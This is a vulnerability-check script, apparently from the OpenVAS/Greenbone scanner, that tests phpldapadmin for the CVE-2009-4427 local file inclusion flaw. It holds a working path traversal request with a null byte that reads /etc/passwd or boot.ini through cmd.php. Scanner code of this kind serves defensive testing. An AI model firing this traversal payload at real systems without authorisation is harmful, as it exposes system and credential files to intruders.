if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100396" );
	script_version( "2020-10-20T15:03:35+0000" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2009-12-15 19:11:56 +0100 (Tue, 15 Dec 2009)" );
	script_cve_id( "CVE-2009-4427" );
	script_bugtraq_id( 37327 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "phpldapadmin 'cmd.php' Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/37327" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "phpldapadmin_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "phpldapadmin/installed" );
	script_tag( name: "summary", value: "phpldapadmin is prone to a local file-include vulnerability because it
fails to sufficiently sanitize user-supplied data." );
	script_tag( name: "impact", value: "Exploiting this issue may allow an attacker to compromise the
application and the underlying system, other attacks are also
possible." );
	script_tag( name: "affected", value: "phpldapadmin 1.1.0.5 is vulnerable, other versions may also be
affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!version = get_kb_item( NASLString( "www/", port, "/phpldapadmin" ) )){
	exit( 0 );
}
if(!matches = eregmatch( string: version, pattern: "^(.+) under (/.*)$" )){
	exit( 0 );
}
dir = matches[2];
if(isnull( dir )){
	exit( 0 );
}
url = NASLString( dir, "/index.php" );
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(buf == NULL){
	exit( 0 );
}
c = eregmatch( pattern: "PLASESSID=([^;]+);", string: buf );
if(isnull( c )){
	exit( 0 );
}
host = get_host_name();
files = make_list( "boot.ini",
	 "etc/passwd" );
for file in files {
	req = NASLString( "GET ", dir, "/cmd.php?cmd=../../../../../../../../../", file, "%00 HTTP/1.1\\r\\nHost: ", host, ":", port, "\\r\\nCookie: PLASESSID=", c[1], "\\r\\n\\r\\n" );
	buf = http_keepalive_send_recv( port: port, data: req );
	if(buf == NULL){
		continue;
	}
	if(egrep( pattern: "(root:.*:0:[01]:|\\[boot loader\\])", string: buf, icase: TRUE )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

